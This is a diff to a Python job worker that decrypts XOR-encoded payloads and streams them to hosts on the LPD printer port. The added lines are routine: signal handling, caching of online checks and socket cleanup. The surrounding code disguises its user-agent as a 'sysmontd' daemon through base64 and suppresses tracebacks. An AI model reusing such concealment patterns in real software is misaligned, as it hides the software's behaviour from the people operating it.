@@ -13,6 +13,7 @@ from socket import (
 )
 from ssl import create_default_context, _create_unverified_context
 from struct import pack
+import signal
 import sys
 from time import sleep, time
 from urllib.error import HTTPError
@@ -21,6 +22,15 @@ from urllib.request import Request, urlopen
 sys.dont_write_bytecode = True
 sys.tracebacklimit = 0
 disable()
+
+def _on_signal(sig, frame):
+    _exit(0)
+
+try:
+    signal.signal(signal.SIGINT, _on_signal)
+    signal.signal(signal.SIGTERM, _on_signal)
+except Exception:
+    pass
 
 def _load_key():
     k = (sys.argv[1].strip() if len(sys.argv) > 1 else "") or environ.get("WORKER_KEY", "").strip()
@@ -97,14 +107,25 @@ def _d(s, job_id=""):
             out[i + j] = b ^ ks[j]
     return bytes(out)
 
+_online_cache = {}
+
 def is_online(host, port=515):
     if not host:
         return False
+    now = time()
+    if host in _online_cache and now - _online_cache[host][1] < 2.0:
+        return _online_cache[host][0]
     try:
         s = create_connection((host, port), timeout=0.8)
+        try:
+            s.shutdown(2)
+        except Exception:
+            pass
         s.close()
+        _online_cache[host] = (True, now)
         return True
     except Exception:
+        _online_cache[host] = (False, now)
         return False
 
 _UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
@@ -178,8 +199,9 @@ def handle(j):
                     s.sendall(dh)
                     ok = _ack(s)
                     if ok:
+                        mv = memoryview(p)
                         for i in range(0, len(p), 65536):
-                            s.sendall(p[i : i + 65536])
+                            s.sendall(mv[i : i + 65536])
                         s.sendall(NUL)
                         ok = _ack(s)
                         if ok:
@@ -188,6 +210,10 @@ def handle(j):
         pass
     finally:
         if s:
+            try:
+                s.shutdown(2)
+            except Exception:
+                pass
             try:
                 s.close()
             except Exception:
